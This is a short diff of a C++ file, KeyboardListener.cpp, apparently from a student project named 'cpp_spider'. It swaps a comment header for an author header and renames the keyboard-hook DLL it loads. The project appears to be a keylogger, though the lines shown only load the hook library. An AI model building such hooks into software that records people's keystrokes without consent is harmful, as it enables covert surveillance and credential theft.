@@ -1,7 +1,12 @@
-// KeyboardListener.cpp : Définit le point d'entrée pour l'application console.
 //
-
-#include "stdafx.h"
+// KeyboardListener.cpp for KeyboardListener in c:\Users\49207\Documents\Epitech-Rendu\cpp_spider\src\dll
+//
+// Made by Axel Drozdzynski
+// Login   <drozdz_b>
+//
+// Started on  Sat Oct 6 19:25:34 2017 Axel Drozdzynski
+// Last update Sat Oct 6 19:26:04 2017 Axel Drozdzynski
+//
 
 #include <fstream>
 #include <thread>
@@ -42,7 +47,7 @@ int APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved) {
 int KeyboardListener::run()
 {
 	std::cout << "KeyboardListener::run()" << std::endl;
-	_dll = LoadLibrary(L"KBHook.dll");
+	_dll = LoadLibrary("libKBHook.dll");
 	if (!_dll)
 	{
 		std::cerr << "Could not load the dynamic library KBHook" << std::endl;
